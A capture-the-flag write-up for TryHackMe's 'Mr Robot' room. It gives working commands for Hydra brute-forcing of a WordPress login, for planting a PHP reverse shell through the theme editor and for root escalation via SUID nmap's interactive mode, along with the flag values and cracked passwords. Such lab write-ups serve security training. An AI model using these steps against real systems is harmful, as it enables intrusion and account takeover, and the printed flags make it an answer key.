# Mr Robot CTF

Room [Mr Robot CTF](https://tryhackme.com/room/mrrobot) on TryHackMe

#

Make a directory with the room name in the Tryhackme Folder.

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "MrRobotCTF".

`mkdir MrRobotCTF`

- Change directory into MrRobotCTF.

`cd MrRobotCTF/`

<p align="center"> <img src="hhttps://i.imgur.com/GAgB1J0.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.64.31], then [10.10.255.40]

#

# Reconnaissance

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 10.10.64.31`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.64.31`.

<p align="center"> <img src="https://i.imgur.com/NXqOWza.png" height="90%" width="90%" alt=""/>

Gather the directories and files of the webpage with `Gobuster` command.

On Terminal: `gobuster dir -u 10.10.64.31 -w ../../wordlists/dirbuster/directory-list-2.3-medium.txt | tee Gobuster.txt`

- `gobuster`: This is the command for Gobuster, a tool used for directory and file brute-forcing in web applications.
- `dir`: Specifies that Gobuster should perform directory brute-forcing.
- `-u 10.10.64.31`: Specifies the target URL. In this case, the IP address is 10.10.64.31.
- `-w ../../wordlists/dirbuster/directory-list-2.3-medium.txt`: Specifies the path to the wordlist file (directory-list-2.3-medium.txt) that contains the list of directories to be tested.
- `|`: The pipe operator redirects the output of the gobuster command to the next command.
- `tee Gobuster.txt`: The tee command takes the output from Gobuster and writes it to both the terminal (standard output) and a file named Gobuster.txt.

<p align="center"> <img src="https://i.imgur.com/2wiNv42.png" height="90%" width="90%" alt=""/>

# 

# Examine the Webpage

Navigate to the IP Address of the Machine.

<p align="center"> <img src="https://i.imgur.com/Io2EkuV.png" height="90%" width="90%" alt=""/>

Checking the page source.
- Nothing really interesting.

<p align="center"> <img src="https://i.imgur.com/iSyB7y7.png" height="90%" width="90%" alt=""/>

Checking `/robots.txt` to see if there is any info on web crawler.

<p align="center"> <img src="https://i.imgur.com/SEHPW6F.png" height="90%" width="90%" alt=""/>

We can download those file or directory written in the /robots.txt by navigating to it.
- http://10.10.64.31/fsocity.dic
- http://10.10.64.31/key-1-of-3.txt
 
`http://10.10.64.31/fsocity.dic` seems like a wordlist, we will "Ctrl + S" to download it to our project directory.

<p align="center"> <img src="https://i.imgur.com/7Mgqpoq.png" height="90%" width="90%" alt=""/>

`http://10.10.64.31/fsocity.dic` seems like a flag. 

<p align="center"> <img src="https://i.imgur.com/DoZrePx.png" height="90%" width="90%" alt=""/>

Question 1: What is key 1?

`073403c8a58a1f80d943455fb30724b9`

#

# Examine the Different Directories from Gobuster

From Gobuster, we can see that there is a "wp-login" directory.

<p align="center"> <img src="https://i.imgur.com/qqIeG3d.png" height="90%" width="90%" alt=""/>

We will navigate to that directory and examine the page.
- We can see that it is a wordpress login.

<p align="center"> <img src="https://i.imgur.com/biGXBhv.png" height="90%" width="90%" alt=""/>

We will try to use Burp Suite to get the credentials to do a bruteforce with hydra.
- Open Burp Suite > Proxy > Open browser > go to: "http://10.10.64.31/wp-login".

<p align="center"> <img src="https://i.imgur.com/JTuzNE7.png" height="90%" width="90%" alt=""/>

On Burp Suite browser type in: admin:admin > Turn on Interception on Burp Suite > Click on "Log In".

<p align="center"> <img src="https://i.imgur.com/5C0Z9UD.png" height="90%" width="90%" alt=""/>

We got the credential to be `log=admin&pwd=admin`, in hydra we will turn it into: `log=^USER^&pwd=^PASS^

<p align="center"> <img src="https://i.imgur.com/1bczwez.png" height="90%" width="90%" alt=""/>

We will turn off intercept on Burp Suite to see the fail login text.
- Fail login text: `Invalid username`.

<p align="center"> <img src="https://i.imgur.com/sS4Muxl.png" height="90%" width="90%" alt=""/>

#

# Use Hydra to Bruteforce

We will first try to use the "fsocity.dic" as a username for the bruteforce.

We will use this command:

`hydra -L fsocity.dic -p test 10.10.64.31 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30`

- `hydra`: This is the command for Hydra, a popular password-cracking tool.
- `-L fsocity.dic`: Specifies the path to a file (fsocity.dic) containing a list of usernames. -L is used for specifying the login file.
- `-p test`: Specifies a static password to use during the brute-force attack. In this case, the password is set to "test."
- `10.10.64.31`: The target IP address for the brute-force attack.
- `http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`:
  - `http-post-form`: Specifies the attack type as an HTTP POST form-based attack.
  - `"/wp-login.php`: The target login page URL.
  - `log=^USER^&pwd=^PASS^`: The form parameters to be sent during the attack. ^USER^ and ^PASS^ are placeholders that Hydra will replace with the username and password from the provided files.
  - `:Invalid username"`: The failure message indicating that the login attempt was unsuccessful.
  - `-t 30`: Specifies the number of parallel tasks or threads. In this case, it's set to 30, meaning that Hydra will try to perform the attack using up to 30 parallel connections.

Successfully got `Elliot` as an username.

<p align="center"> <img src="https://i.imgur.com/ajl2UMv.png" height="90%" width="90%" alt=""/>

#

We will now see what happens when we put in a correct username name to get the fail login credential again.

On the webpage put in: Elliot:admin 
- Got the fail login credential: "The password you entered for the username Elliot is incorrect."

<p align="center"> <img src="https://i.imgur.com/lmONA1H.png" height="90%" width="90%" alt=""/>

#

We will now change the commnad for hydra a little and bruteforce again.

Command: `hydra -l Elliot -P fsocity.dic 10.10.64.31 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30`

- `hydra`: This is the command for Hydra, a popular password-cracking tool.
- `-l Elliot`: Specifies the login username to be "Elliot."
- `-P fsocity.dic`: Specifies the path to a file containing a list of passwords (fsocity.dic in this case).
- `10.10.64.31`: The IP address of the target system.
- `http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username Elliot is incorrect.":`
  - `"/wp-login.php`: The URL of the login page.
  - `log=^USER^&pwd=^PASS^`: The form data to be sent, where ^USER^ and ^PASS^ will be replaced by Hydra during the brute-force attack.
  - `The password you entered for the username"`: The failure message indicating an unsuccessful login attempt.
  - `-t 30`: Limits the number of tasks to 30. This is the number of parallel connections Hydra will use to perform the attack.
 
Successfully found the password for `Elliot` to be `ER28-0652`

<p align="center"> <img src="https://i.imgur.com/z7L0i7K.png" height="90%" width="90%" alt=""/>

#

# Login and Examine

Login with `Elliot:ER28-0652`

<p align="center"> <img src="https://i.imgur.com/VJT0D75.png" height="90%" width="90%" alt=""/>

Found that we can use the editor to update the file.

<p align="center"> <img src="https://i.imgur.com/wVrBS5v.png" height="90%" width="90%" alt=""/>

We will navigate to the `archives.php` to update and upload a reverse shell into the machine.

<p align="center"> <img src="https://i.imgur.com/41uVJX8.png" height="90%" width="90%" alt=""/>

#

# Upload Reverse Shell.

First we will use `ncat` command to listen on port 1202.

<p align="center"> <img src="https://i.imgur.com/Zj9snlU.png" height="90%" width="90%" alt=""/>

Now we will google: "Reverse shell upload file github" > Click on the first one.

<p align="center"> <img src="https://i.imgur.com/jsv0YQs.png" height="90%" width="90%" alt=""/>

Go to `php-reverse-shell.php` > copy the whole thing and paste onto the editor.

<p align="center"> <img src="https://i.imgur.com/ct9fSIg.png" height="90%" width="90%" alt=""/>

<p align="center"> <img src="https://i.imgur.com/0AXAwL1.png" height="90%" width="90%" alt=""/>

Now change the IP Address on the reverse shell into our own machine `10.6.106.187`, change the port into `1202`.

Press "Update File".

<p align="center"> <img src="https://i.imgur.com/fFkK2V1.png" height="90%" width="90%" alt=""/>

We will now navigate to `http://10.10.64.31/wp-content/themes/twentyfifteen/archive.php` to exploit the shell.

- Successfully got in with the reverse shell in `ncat`.

<p align="center"> <img src="https://i.imgur.com/YTW44JQ.png" height="90%" width="90%" alt=""/>

#

# Exploit the Shell

Sidenote: Machine Expired, new machine IP Address: [10.10.255.40]

We change the directory into "Robot". Found key-2.txt, but can't read. There is another file that we can read: "password.raw-md5".

<p align="center"> <img src="https://i.imgur.com/8FWLUqt.png" height="90%" width="90%" alt=""/>

The file "password.raw-md5" contain a password hash: `c3fcd3d76192e4007dfb496cca67e13b`.  We will use John the Ripper to crack it.

#

# John the Ripper

We will first create a new txt file and put the hash value in it, name it "hash.txt".
 
<p align="center"> <img src="https://i.imgur.com/pxxJH8J.png" height="90%" width="90%" alt=""/>

Now we will use the command `john` to crack the hash.

`john hash.txt --wordlist=../../wordlists/rockyou.txt --format=Raw-MD5`
- Successfully cracked the hash: `abcdefghijklmnopqrstuvwxyz`

<p align="center"> <img src="" height="90%" width="90%" alt=""/>

#

# Change Shell User to Robot

To upgrade our shell we have to type in: `python -c 'import pty;pty.spawn("/bin/bash")'`

<p align="center"> <img src="https://i.imgur.com/P7xAlg3.png" height="90%" width="90%" alt=""/>

Now we will need to change directory into robot file and change user to robot using `su robot`.
- Successfully changed to robot account.

<p align="center"> <img src="https://i.imgur.com/fXaXqvP.png" height="90%" width="90%" alt=""/>

Now we can read the key-2-of-3.txt

<p align="center"> <img src="https://i.imgur.com/FEX2OEa.png" height="90%" width="90%" alt=""/>

Question 2: What is key 2?

`822c73956184f694993bede3eb39f959`

#

# Root Privilege Escalation

We will try to get in the root account by looking for suid binaries to bypass.

`find / -perm -4000 2>/dev/null`
- We see that `/usr/local/bin/nmap` is there and it's very suspicious.

<p align="center"> <img src="https://i.imgur.com/STvc4Hl.png" height="90%" width="90%" alt=""/>

Now we will go to Gtfobins [https://gtfobins.github.io/gtfobins/nmap/#suid] to search for an exploit for nmap shell.

<p align="center"> <img src="https://i.imgur.com/BW4pgD0.png" height="90%" width="90%" alt=""/>

We will navigate to the directory: `/usr/local/bin`

<p align="center"> <img src="https://i.imgur.com/kR6QTlu.png" height="90%" width="90%" alt=""/>

We now copy the command `nmap --interactive` that we found for nmap shell on Gtfobins. And run it on the shell.

<p align="center"> <img src="https://i.imgur.com/V4fBctY.png" height="90%" width="90%" alt=""/>

<p align="center"> <img src="https://i.imgur.com/HEjoxTY.png" height="90%" width="90%" alt=""/>

Now we just have to type in: `!sh`

<p align="center"> <img src="https://i.imgur.com/tGAmAuW.png" height="90%" width="90%" alt=""/>

Successfully captured the last flag.

<p align="center"> <img src="https://i.imgur.com/y2kyhjW.png" height="90%" width="90%" alt=""/>

Question 3: What is key 3?

`04787ddef27c3dee1ee161b21670b4e4`
